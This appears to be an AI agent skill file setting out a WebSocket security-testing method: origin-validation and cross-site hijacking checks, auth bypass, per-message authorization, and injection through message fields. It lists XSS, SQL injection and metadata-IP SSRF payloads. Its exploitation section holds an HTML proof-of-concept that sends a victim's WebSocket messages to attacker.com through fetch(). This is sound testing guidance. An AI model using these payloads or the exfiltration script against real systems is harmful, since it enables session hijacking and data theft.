---
name: testing-websocket
description: WebSocket security testing. Use when the application upgrades HTTP connections to WebSocket — identified by ws:// or wss:// URLs in the application, HTTP 101 Switching Protocols responses, or JavaScript using the WebSocket API. Covers Cross-Site WebSocket Hijacking (CSWSH), origin validation bypass, authentication handling, message-level injection, subprotocol abuse, and authorization bypass per message.
---

# WebSocket Security Testing

WebSocket maintains a persistent, bidirectional connection between client and server. This creates security challenges distinct from HTTP: persistent auth state, no per-message CSRF tokens, cross-origin implications for the upgrade handshake, and message-level authorization that developers frequently get wrong.

## Reference Files

- [attacks.md](./attacks.md) — CSWSH exploitation, message injection techniques, and authentication bypass patterns

## Mental Model

A WebSocket connection has two phases:
1. **Handshake (HTTP):** Client sends HTTP request with `Upgrade: websocket`. Server responds with 101.
2. **Data frames (WS protocol):** Bidirectional message flow over the persistent connection.

Security concerns are different in each phase:
- **Handshake:** Is the Origin validated? Is authentication required? Browser's same-origin policy doesn't apply.
- **Data frames:** Are messages authenticated and authorized? What if messages arrive out of sequence?

**The critical insight:** The browser's same-origin policy does NOT apply to WebSocket handshakes. Any origin can initiate a WebSocket connection to any server. Cookies are sent automatically (like CSRF). If the server only checks "is this user logged in?" without verifying the Origin, attackers can create WebSocket connections from their site using the victim's cookies.

## Workflow

```
1. BASELINE → 2. CONFIRMATION → 3. NEGATIVE VERDICT → 4. EXPLOITATION
   (WS behavior)    (test controls)   (declare secure)     (demonstrate attack)

   Stop conditions checked at every step ↓
```

---

## Phase 1: Baseline

### Step 1.1: WebSocket Discovery
Find WebSocket connections:
- Browser DevTools → Network → WS filter
- Source code search for `new WebSocket(...)`, `io(...)` (Socket.IO)
- URLs starting with `ws://` or `wss://`

### Step 1.2: Handshake Analysis
Capture the upgrade request:
```
GET /ws HTTP/1.1
Host: target.com
Origin: https://target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: ...
Sec-WebSocket-Version: 13
Cookie: session=...
Authorization: Bearer ...
```

Record:
- Is authentication via cookie? Authorization header? Token in URL?
- What Origin is the server expecting?
- Is there a Sec-WebSocket-Protocol (subprotocol)?

### Step 1.3: Message Format Analysis
Observe normal WebSocket traffic:
- Format: JSON? Plain text? Binary? Custom protocol?
- Message types: commands, data updates, subscriptions, heartbeats
- Authentication state: per-connection or per-message?

### Reasoning Checkpoint
```
[PHASE-1] Baseline
[WS-URL] {endpoint}
[AUTH-MECHANISM] {cookie / bearer / token in URL / none}
[ORIGIN-VALIDATION] {unknown — will test}
[MESSAGE-FORMAT] {JSON / text / binary}
[AUTH-LEVEL] {per-connection / per-message}
[DECISION] Proceed
```

---

## Phase 2: Confirmation

### Confidence Definitions
| Level | For WebSocket |
|-------|--------------|
| HIGH | Cross-origin WebSocket accepted with victim's credentials, OR message injection produces unauthorized actions |
| MEDIUM | Cross-origin connection accepted but exploitation requires additional conditions |
| LOW | Origin validated, authentication required, message-level authz enforced |

### Step 2.1: Origin Validation Test (CSWSH)

Send a handshake request with different Origin values:
```
Origin: https://evil.com
Origin: https://evil-target.com
Origin: https://target.com.evil.com
Origin: null
Origin: (omitted entirely)
```

If the server completes the handshake (101 response) with any of these → Origin validation broken. Cross-Site WebSocket Hijacking (CSWSH) is possible.

**What CSWSH means:** Attacker hosts a page that opens `new WebSocket("wss://target.com/ws")`. The browser automatically includes the victim's cookies. If the server accepts the connection, the attacker can:
- Send messages AS the victim
- Receive messages that were intended for the victim
- Read the victim's private data streamed over WS

### Step 2.2: Authentication Bypass

Test if authentication is actually required:
```
Connect without any authentication cookie/token
Connect with invalid token
Connect with expired token
```

If any of these succeed → authentication not enforced at handshake.

### Step 2.3: Message-Level Authorization

Even if handshake requires auth, messages may not be authorized per-operation:
```
Send: {"action": "subscribe", "channel": "admin-events"}
Send: {"action": "subscribe", "channel": "user-456-private-feed"}  (another user's feed)
Send: {"action": "execute", "command": "admin_reset_db"}
```

If these messages are accepted and acted on despite your role, authorization is missing at the message level.

### Step 2.4: Message Injection

WebSocket messages are parameters. Test them like HTTP parameters:
```
{"type": "chat", "message": "<script>alert(1)</script>"}   → XSS via WS (if rendered)
{"type": "search", "query": "' OR 1=1--"}                   → SQLi via WS parameter
{"type": "fetch", "url": "http://169.254.169.254/..."}      → SSRF via WS
```

Messages over WebSocket bypass traditional HTTP-layer WAFs.

### Step 2.5: Subprotocol Negotiation

If the server supports multiple subprotocols (`Sec-WebSocket-Protocol: json, binary`), test:
- Does requesting a specific subprotocol change security behavior?
- Does requesting an unknown subprotocol cause errors that reveal information?

**Max confirmation attempts: 8.**

### Reasoning Checkpoint
```
[PHASE-2] Confirmation
[TECHNIQUE] {CSWSH / auth bypass / message authz / injection}
[RESULT] {cross-origin accepted / unauthorized action / injection worked / nothing}
[CONFIDENCE] {HIGH / MEDIUM / LOW}
[DECISION] {Proceed / Negative verdict}
```

---

## Negative Verdict

### True Negative Conditions
- Origin strictly validated on handshake
- Authentication required and enforced
- Messages authorized per-operation
- No injection vectors via message parameters
- Tested CSWSH, auth bypass, message authz, and injection

---

## Phase 3: Exploitation

### Level 1: CSWSH PoC `[EXTERNAL INFRA REQUIRED]`
```html
<script>
  const ws = new WebSocket("wss://target.com/ws");
  ws.onopen = () => {
    ws.send('{"action":"get_user_data"}');
  };
  ws.onmessage = (event) => {
    // Exfiltrate victim's WebSocket messages to attacker
    fetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));
  };
</script>
```
Host this page, have victim visit → their WebSocket messages flow to the attacker.

### Level 2: Unauthorized Action
Send a privileged command via the hijacked or unauthorized connection. Demonstrate impact.

**Stop condition:** Unauthorized access demonstrated → STOP.

---

## Things to Do
- Test CSWSH first — it's the highest-impact WebSocket vulnerability
- Check authentication scope: per-connection (check once at handshake) vs per-message (check every message)
- Test message parameters for injection just as you would HTTP parameters
- Check Origin handling comprehensively — reflection, null, omission, case variations

## Things Not to Do
- Do not assume WebSocket inherits HTTP security — it has its own rules
- Do not assume WAF protects WebSocket — most WAFs don't inspect WS frames
- Do not flood WebSocket connections — test with minimal traffic

## Cross-Skill Links
- [[csrf]] — CSWSH is the WebSocket equivalent of CSRF
- [[xss]] — Message data rendered in DOM may enable XSS
- [[sqli]] — Message fields may flow into database queries
- [[idor]] — Channel/resource identifiers in WS messages can enable IDOR
